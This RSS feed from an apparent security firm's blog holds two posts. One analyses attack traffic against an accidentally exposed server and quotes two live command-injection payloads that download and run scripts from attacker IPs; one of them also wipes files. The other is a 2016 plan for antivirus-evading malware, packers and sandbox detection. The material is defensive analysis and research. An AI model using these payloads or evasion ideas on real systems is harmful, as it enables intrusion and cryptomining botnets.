<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>JUMPSEC ‚Äì Binary-Analysis</title>
    <link>//localhost:1313/categories/binary-analysis/</link>
    <description>Recent content in Binary-Analysis on JUMPSEC</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-GB</language>
    <lastBuildDate>Thu, 16 May 2024 00:00:00 +0000</lastBuildDate>
    
	  <atom:link href="//localhost:1313/categories/binary-analysis/index.xml" rel="self" type="application/rss+xml" />
    
    
      
        
      
    
    
    <item>
      <title>Adventures and Accidental Honeypots in Network Infrastructure: Unravelling Internet Shenanigans</title>
      <link>//localhost:1313/articles/2024/05/2024-05-16-adventures-and-accidental-honeypots-in-network-infrastructure-unravelling-internet-shenanigans/</link>
      <pubDate>Thu, 16 May 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/05/2024-05-16-adventures-and-accidental-honeypots-in-network-infrastructure-unravelling-internet-shenanigans/</guid>
      <description>
        
        
        &lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/welcome.gif&#34; title=&#34;welcome&#34; alt=&#34;welcome&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;welcome&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Hello World! So, I&amp;rsquo;ve been tinkering with network stuff lately, trying to set up some infrastructure.Turns out that in the process, I made a rookie mistake and left a few ports open to the internet! A few months down the line I took a look and to no one‚Äôs surprise my server had been bombarded with all sorts of requests. It was receiving a steady stream of traffic, but not the good kind‚Ä¶think of it more as a steady dose of ‚Äúinternet radiation‚Äù. Without realising it I had accidentally turned my server into a honeypot.&lt;/p&gt;
&lt;p&gt;So, naturally curious I started digging into my server logs and what I found was equal parts fascinating and alarming. Let&amp;rsquo;s just say there&amp;rsquo;s a lot of shady stuff going on out there, from random bots on the site, directory traversal with known path (/.git/config wink wink), to common network appliance enumeration. You name it, they were trying it.&lt;/p&gt;
&lt;p&gt;But here&amp;rsquo;s where things get interesting: Among all the noise, there are some requests that stand out. Like, seriously weird stuff. It&amp;rsquo;s like people are trying to target anything and everything they can get their hands on.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Sample 0:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image11.png&#34; title=&#34;image11&#34; alt=&#34;image11&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image11&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;And sometimes they are nice enough to actually tell you who they are üôÇ&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Sample 1:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image12.png&#34; title=&#34;image12&#34; alt=&#34;image12&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image12&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;From the looks of this particular request it‚Äôs already got some bash looking code in the payload. Let‚Äôs convert the URL encoding to make it more readable.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;/cgi-bin/luci/;stok=/locale?form=country&amp;amp;operation=write&amp;amp;country=$(rm -rf *; cd /tmp; wget http://94.156.79.129/tenda.sh; chmod 777 tenda.sh; ./tenda.sh)&lt;/em&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;This resembles a command injection attack on OpenWRT routers running LuCI web interface (/cgi-bin/luci/). After a bit of googling, this actually targets routers vulnerable to CVE-2023-1389 as an initial step to breach the perimeter. Then proceed to download another bash script payload (tenda.sh), set it up and execute the script.&lt;/p&gt;
&lt;p&gt;Unfortunately, at the time of investigation, the hosted script is no longer available. But fear not, Google to the rescue! It looks like someone has already uploaded the script to any.run. This gives us an opportunity to dig deeper into what the attack is capable of.&lt;/p&gt;
&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image9.png&#34; title=&#34;image9&#34; alt=&#34;image9&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image9&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;em&gt;Content of tenda.sh script.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image9content-of-tendash-script&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image9content-of-tendash-script&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image10.png&#34; title=&#34;image10&#34; alt=&#34;image10&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image10&lt;/figcaption&gt;
  &lt;/figure&gt;redtail binary packed with the late version of UPX 3.94. (3.94 released in 12th May 2017)&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image10redtail-binary-packed-with-the-late-version-of-upx-394-394-released-in-12th-may-2017&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image10redtail-binary-packed-with-the-late-version-of-upx-394-394-released-in-12th-may-2017&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;Upon initial inspection, it looks like a script that contacts the C2 server and downloads then executes the payloads in various CPU architectures. Readers with a keen eye may have already spotted that this behaviour is highly similar to the propagation of the infamous Mirai botnet.&lt;/p&gt;
&lt;p&gt;Hexdump functionality on any.run allows us to inspect the payload binary file, which gives us some hints to unpack the executable with UPX. Let‚Äôs grab the binary file and dissect it further locally (do this at your own risk, it is highly recommended to deal with malware in an isolated environment).&lt;/p&gt;
&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image7.png&#34; title=&#34;image7&#34; alt=&#34;image7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image7&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;em&gt;UPX unpacking the binary like a charm.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image7upx-unpacking-the-binary-like-a-charm&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image7upx-unpacking-the-binary-like-a-charm&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image6.png&#34; title=&#34;image6&#34; alt=&#34;image6&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image6&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;em&gt;Successfully using UPX to unpack the binary. Section headers are also restored.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image6successfully-using-upx-to-unpack-the-binary-section-headers-are-also-restored&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image6successfully-using-upx-to-unpack-the-binary-section-headers-are-also-restored&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image16.png&#34; title=&#34;image16&#34; alt=&#34;image16&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image16&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;em&gt;Strings from the mips binary with references to further propagation of Mirai Botnet.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image16strings-from-the-mips-binary-with-references-to-further-propagation-of-mirai-botnet&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image16strings-from-the-mips-binary-with-references-to-further-propagation-of-mirai-botnet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image14.png&#34; title=&#34;image14&#34; alt=&#34;image14&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image14&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;em&gt;Strings from the mips binary with references to further propagation of Mirai Botnet.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image14strings-from-the-mips-binary-with-references-to-further-propagation-of-mirai-botnet&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image14strings-from-the-mips-binary-with-references-to-further-propagation-of-mirai-botnet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;Luckily there are no anti-unpacking measures in place for the binary, and UPX has worked flawlessly to recover the original binary executable with all the section headers intact. Armed with the new information from the unpacked binary, it seems to be leveraging SSDP multicast packets to further identify devices on the network using DIAL protocol. The XML soap request seems to contain payload for further exploitation on vulnerable Huawei routers (CVE-2017-17215), which confirms the malware is attributed to Mirai botnet propagation.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Sample 2:&lt;/strong&gt;¬†&lt;/p&gt;
&lt;h3&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image5.png&#34; title=&#34;image5&#34; alt=&#34;image5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image5&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image5&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image5&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;/api/v1/totp/user-backup-code/../../license/keys-status/;curl http://94.156.79.60/iv.sh | sh || wget -O- http://94.156.79.60/iv.sh | sh;&lt;/em&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Next up is this specimen. This request again resembles a command injection attack. However, this time it‚Äôs targeting the Ivanti Connect Secure web component vulnerable to CVE-2024-21887(/api/v1/totp/user-backup-code/), gaining a foothold and then downloading and executing the iv.sh script by piping it to sh(shell command interpreter).&lt;/p&gt;
&lt;p&gt;Again, the hosted script was no longer available at the time of investigation. Fortunately, thanks to the amazing cyber community, someone has also uploaded the sample onto any.run for further analysis.&lt;/p&gt;
&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image4.png&#34; title=&#34;image4&#34; alt=&#34;image4&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image4&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;em&gt;Content of iv.sh script&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image4content-of-ivsh-script&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image4content-of-ivsh-script&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image1-1.png&#34; title=&#34;image1 1&#34; alt=&#34;image1 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image1 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;em&gt;redtail binary packed with the late version of UPX 4.23. Suggesting that the payload was generated fairly recently (4.2.3 released on 27th March 2024)&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image1-1redtail-binary-packed-with-the-late-version-of-upx-423-suggesting-that-the-payload-was-generated-fairly-recently-423-released-on-27th-march-2024&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image1-1redtail-binary-packed-with-the-late-version-of-upx-423-suggesting-that-the-payload-was-generated-fairly-recently-423-released-on-27th-march-2024&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image15.png&#34; title=&#34;image15&#34; alt=&#34;image15&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image15&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image13.png&#34; title=&#34;image13&#34; alt=&#34;image13&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image13&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image15image13&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image15image13&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image17-1.png&#34; title=&#34;image17 1&#34; alt=&#34;image17 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image17 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image2.png&#34; title=&#34;image2&#34; alt=&#34;image2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;em&gt;Strings from the redtail binary with loads of reference to crypto mining operations&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image17-1image2strings-from-the-redtail-binary-with-loads-of-reference-to-crypto-mining-operations&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image17-1image2strings-from-the-redtail-binary-with-loads-of-reference-to-crypto-mining-operations&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;Running this script will again contact the C2 server, downloading and executing a version of binary payload based on the CPU architecture of the compromised device. The name of the binary ‚Äúredtail‚Äù might have given away the type of malware: &lt;em&gt;Cryptominers!&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Inspecting the strings after unpacking the binary also confirms this theory.&lt;/p&gt;
&lt;p&gt;So, what have we learned? There is a lot of noise around the dangers of ports open to the internet when we are talking about cyber security. For some who have yet to open a port(s) and watch what happens this might seem a bit dramatic. However, your exposed services are constantly being targeted by all kinds of attacks! Remediating this issue is simple: place the web service behind some form of proxy or firewall, whether that be at the host, application or cloud level. I like Cloudflare proxy, and I ensure to whitelist the exposed ports to Cloudflare listed proxies IP addresses. Fun fact: you only need to do one of the 15 ranges listed on their website and it will work.&lt;/p&gt;
&lt;p&gt;Until next time! Stay safe out there ;)&lt;/p&gt;
&lt;h2&gt;&lt;figure&gt;
    &lt;img src=&#34;images/x17K5U4.gif&#34; title=&#34;x17K5U4&#34; alt=&#34;x17K5U4&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;x17K5U4&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;x17k5u4&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#x17k5u4&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;¬†&lt;/p&gt;
&lt;p&gt;But also, here‚Äôs a list of more trivial ones that were picked up:&lt;/p&gt;
&lt;p&gt;[table id=5 /]&lt;/p&gt;
&lt;h2&gt;References:&lt;span class=&#34;absolute -mt-20&#34; id=&#34;references&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#references&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://openwrt.org/docs/guide-user/luci/start&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://openwrt.org/docs/guide-user/luci/start&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.greynoise.io/blog/active-exploitation-attempts-cve-2023-1389-against-tp-link-archer-gigabit-internet-routers&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.greynoise.io/blog/active-exploitation-attempts-cve-2023-1389-against-tp-link-archer-gigabit-internet-routers&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2023/4/21/tp-link-wan-side-vulnerability-cve-2023-1389-added-to-the-mirai-botnet-arsenal&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.zerodayinitiative.com/blog/2023/4/21/tp-link-wan-side-vulnerability-cve-2023-1389-added-to-the-mirai-botnet-arsenal&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://answers.microsoft.com/en-us/windows/forum/all/ssdp-messages/ba8f36d0-6b4a-4735-84f9-db25e273c71f&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://answers.microsoft.com/en-us/windows/forum/all/ssdp-messages/ba8f36d0-6b4a-4735-84f9-db25e273c71f&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/43414&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.exploit-db.com/exploits/43414&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-21887&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-21887&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://developers.cloudflare.com/fundamentals/concepts/cloudflare-ip-addresses/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://developers.cloudflare.com/fundamentals/concepts/cloudflare-ip-addresses/&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Research and Development</title>
      <link>//localhost:1313/articles/2016/01/2016-01-28-research-and-development/</link>
      <pubDate>Thu, 28 Jan 2016 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2016/01/2016-01-28-research-and-development/</guid>
      <description>
        
        
        &lt;p&gt;Hello w0rld. On this post we would like to let you know our areas of research and the research projects that we are working on currently. For 2016 we are planning to develop tools that will be used in our tests. Our areas of interest can be highlighted as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;AntiVirus Detection and Evasion techniques (sandbox detection, etc)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Packers, anti-debugging, anti-disassembly and binary obfuscation&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Network packet capture analysis scripts looking for IoC&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;FUD Malware (maybe Veil Improvisation)&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The initial idea is to find a way to create several different templates on top of Veil. Additionally we can implement several add-ons for Virtual Machine detection or Sandbox Environment detection. This can be either logical-based such as human interaction or can be through technical means like red pills. Even 2-3 assembly instructions can be used for identifying a sandbox environment. Veil exports a .py file which is quite random. It randomizes variable names and also since it uses encryption it randomizes the key that will be used. Then it encrypts the payload and stores it in a .stub area on the binary. This area will be unfold after the execution and a routine is responsible for decrypting and launching the payload. This doesn‚Äôt offer and sandbox detection nor VM detection. It is heavily focused against AVs and specifically it is focused defeating signature-based detection systems. The idea of having different binaries but still using the same payload (meterpreter) is necessary for pentesters and for generating quickly payloads that will be used in social engineering tasks. Technically now the most important property is the large keyspace. The larger the key space the more ‚Äòimpossible‚Äô to hit the same binary twice. Veil is providing that but still there are issues with the actual binary. My thought is to either break the exported binary and placed it under a new one OR just add several lines of code in the python script that will be used for compilation (through py2exe or pwninstaller). Another possibility is to mess around the pwninstaller and add things there. Another idea is to add randomisation on techniques defeating / escaping sandbox environments. Things that are looking promising:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Mess with the actual PE Header, things like .STAB areas, add more stab areas add junk data to stab areas or even add other encrypted data that might look interesting (hyperion paper also has a super cool idea‚Ä¶)&lt;/li&gt;
&lt;li&gt;Change the file size of the exported binary dynamically. This will happen assuming the above will happen. (Can also be randomized with NOP padding&lt;/li&gt;
&lt;li&gt;Change values that will not necessarily mess the execution (maybe the versioning of the PE? or the Entry point of the binary?)&lt;/li&gt;
&lt;li&gt;Write a small scale packer for performance and maybe add also VM detection there&lt;/li&gt;
&lt;li&gt;Employ sandbox detection and VM detection through several means (this also adds to the 2nd step)&lt;/li&gt;
&lt;li&gt;Randomized routines for sandbox detection (if mouse_right_click = %random_value then decrypt else break/sleep)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Implementation techniques will include¬†ctypes for sandbox detection and adding loops or other useless things such as¬†calculations. Also using ndisasm or pyelf for messing the binary it is suggested. Red pills can be used in several different techniques.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Packer&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Another idea that JUMPSEC labs have is to develop their own packer. This will have several routines for:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Static analysis obfuscation: Encryption&lt;/li&gt;
&lt;li&gt;Dynamic analysis obfuscation: Add noise in program flow/Add randomness to data/runtime&lt;/li&gt;
&lt;li&gt;Anti-debugging&lt;/li&gt;
&lt;li&gt;Sandbox escape: Detect human interactions&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Network Analysis Scripts&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We are developing several¬†scripts for analysing pcap files. The purpose of these scripts is to parse packet captures and to identify whether there are IoC (Indicators of Compromise) by performing statistical analysis of the protocols usage and searching for potential protocol misuse (HTTP requests / responses that arent according to RFC).&lt;/p&gt;

      </description>
    </item>
    
  </channel>
</rss>
